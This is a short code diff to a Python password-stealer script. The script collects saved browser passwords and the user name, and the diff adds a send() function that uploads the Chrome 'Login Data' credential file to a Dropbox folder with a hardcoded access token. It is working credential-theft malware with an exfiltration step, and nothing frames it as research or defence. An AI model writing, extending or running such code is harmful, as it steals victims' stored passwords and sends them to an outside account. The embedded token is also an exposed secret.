@@ -2,6 +2,7 @@ import os
 import sqlite3
 import shutil
 import getpass
+import dropbox
 try:
     import win32crypt
 except:
@@ -51,13 +52,16 @@ def getpasswords():
     dataToBeSent["user"] = getpass.getuser()
     dataToBeSent["passwords"] = dataList
     return dataToBeSent
-    os.rm(path+'\Login Data')
-
+    
 def send():
 
     jsonData = getpasswords()
-    print(jsonData)
-    
+    #print(jsonData)
+    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAASvntv3YXXNI6X7NJqbpXtsIQZfw4k6tBHocduKNGn8HD')
+    file_from="c:\prog\Login Data"
+    file_to="/kaunheh/Login Data"
+    with open(file_from, 'rb') as f:
+            dbx.files_upload(f.read(), file_to)
 
 def getpath():
 
